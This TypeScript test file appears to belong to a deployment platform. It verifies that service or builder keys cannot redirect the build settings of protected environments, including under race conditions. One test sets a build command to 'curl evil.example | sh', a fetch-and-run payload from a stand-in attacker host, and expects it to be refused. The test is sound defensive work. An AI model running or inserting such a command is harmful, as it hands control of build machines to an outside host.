// A key cannot redirect what a deploy of a protected environment runs (ADR-0050 §4): not with an update interleaved
// with a person's, and not when a protection lands between its check and its write. Through
// the real RPC router and the shipped SQL, on SQLite always and on Postgres when FABRIKA_TEST_POSTGRES_URL is set.

import type { AuthContext } from '@fabrika/auth'
import { type SqlDatabase, SqlDeployLocks } from '@fabrika/platform'
import { afterEach, describe, expect, test } from 'bun:test'
import { ControlRegistryRepository, type ControlRepositories, createControlRepositories } from '../db'
import type { ControlRpcDeps } from '../services'
import { createHarness } from './helpers/harness'
import { authWithActions } from './helpers/iam'
import { fixtureProtect } from './helpers/lock'
import { createPostgres, hasPostgres, skipReason } from './helpers/postgres'
import { fakeControlProvider, providerEnvironment } from './helpers/provider'
import { rpcRequest, rpcResult } from './helpers/rpc'

if (!hasPostgres) console.warn(`protected-redirect.test.ts Postgres half ${skipReason}`)

/** The registry as shipped, with a step a test runs right before the next `updateApp` writes: another caller's change. */
class InterleavedRegistry extends ControlRegistryRepository {
	beforeWrite: (() => Promise<void>) | null = null

	override async updateApp(...args: Parameters<ControlRegistryRepository['updateApp']>): ReturnType<ControlRegistryRepository['updateApp']> {
		const step = this.beforeWrite
		this.beforeWrite = null
		if (step !== null) await step()
		return await super.updateApp(...args)
	}
}

interface Backend {
	db: SqlDatabase
	close(): Promise<void>
}

const backends: { name: string; skip: boolean; open(): Promise<Backend> }[] = [
	{
		name: 'sqlite',
		skip: false,
		open: () => {
			const harness = createHarness()
			return Promise.resolve({ db: harness.d1, close: () => Promise.resolve(harness.sqlite.close()) })
		},
	},
	{
		name: 'postgres',
		skip: !hasPostgres,
		open: async () => {
			const fixture = await createPostgres('control_protected_redirect')
			return { db: fixture.db, close: () => fixture.close() }
		},
	},
]

const manager = authWithActions(['app.manage'], 'op@fabrika.test')
const key: AuthContext = { ...manager, principal: { id: 'svc', type: 'service', label: 'builder' } }
const envelopes = {
	target: { provider: 'harbor', version: 1, payload: { kind: 'target' } },
	artifact: { provider: 'harbor', version: 1, payload: { kind: 'artifact' } },
}
const refusal = (env: string, change: string) =>
	`environment \`${env}\` is protected: only a person changes ${change}, which decides what a deploy there runs; `
	+ 'an agent, a builder key or a service key cannot'

for (const backend of backends) {
	describe.skipIf(backend.skip)(`a key cannot redirect a protected environment (${backend.name})`, () => {
		let opened: Backend | null = null

		afterEach(async () => {
			await opened?.close()
			opened = null
		})

		async function open() {
			const b = await backend.open()
			opened = b
			const registry = new InterleavedRegistry(b.db)
			const repositories: ControlRepositories = { ...createControlRepositories(b.db), registry }
			const as = (auth: AuthContext): ControlRpcDeps => ({
				repositories,
				auth,
				queue: { send: () => Promise.resolve() },
				logs: { get: () => Promise.resolve(null) },
				provider: fakeControlProvider,
				cancelRun: () => Promise.resolve(),
			})
			const update = (auth: AuthContext, app: Record<string, string | null>) => rpcResult(rpcRequest('apps.update', { appId: 'app', app }), as(auth))
			const protect = async (env: string) =>
				expect((await fixtureProtect(registry, new SqlDeployLocks(b.db), { appId: 'app', env }, true))?.protected).toBe(1)
			return { registry, as, update, protect }
		}

		test("a key's stale update leaves a person's change in place, since it writes only what it changes", async () => {
			const f = await open()
			await f.registry.createApp({ id: 'app', repoUrl: 'github.com/acme/app', buildCmd: 'bun run build' })
			await f.registry.upsertAppEnv(providerEnvironment('app', 'prod', { triggerRef: 'refs/heads/main' }))
			// The key read `bun run build` and sends it again; a person changes it before the key's write.
			f.registry.beforeWrite = async () => {
				expect((await f.update(manager, { buildCmd: 'bun run build:prod' })).status).toBe(200)
			}
			expect((await f.update(key, { buildCmd: 'bun run build', defaultBranch: 'main' })).status).toBe(200)
			expect(f.registry.beforeWrite).toBeNull()
			expect(await f.registry.getApp('app')).toMatchObject({ build_cmd: 'bun run build:prod', default_branch: 'main' })
		})

		test("a protection that lands between a key's check and its write refuses the write", async () => {
			const f = await open()
			await f.registry.createApp({ id: 'app', repoUrl: 'github.com/acme/app', buildCmd: 'bun run build' })
			await f.registry.upsertAppEnv(providerEnvironment('app', 'stage', { triggerRef: 'refs/heads/develop' }))
			f.registry.beforeWrite = () => f.protect('stage')
			const refused = await f.update(key, { buildCmd: 'curl evil.example | sh' })
			expect(refused.status).toBe(403)
			expect(await refused.text()).toContain(refusal('stage', "its application's buildCmd"))
			expect((await f.registry.getApp('app'))?.build_cmd).toBe('bun run build')

			// A new environment that starts protected counts the same: `prod`.
			f.registry.beforeWrite = async () => void (await f.registry.upsertAppEnv(providerEnvironment('app', 'prod')))
			const created = await f.update(key, { workerDir: 'apps/other' })
			expect(created.status).toBe(403)
			expect(await created.text()).toContain(`its application's workerDir`)
			expect((await f.registry.getApp('app'))?.worker_dir).toBeNull()
		})

		test('a person changes the build of a protected app, also when the protection lands in between', async () => {
			const f = await open()
			await f.registry.createApp({ id: 'app', repoUrl: 'github.com/acme/app', buildCmd: 'bun run build' })
			await f.registry.upsertAppEnv(providerEnvironment('app', 'stage'))
			f.registry.beforeWrite = () => f.protect('stage')
			expect((await f.update(manager, { buildCmd: 'bun run build:all', configPath: 'deploy/fabrika.config.ts' })).status).toBe(200)
			expect(await f.registry.getApp('app')).toMatchObject({ build_cmd: 'bun run build:all', config_path: 'deploy/fabrika.config.ts' })
		})
	})
}
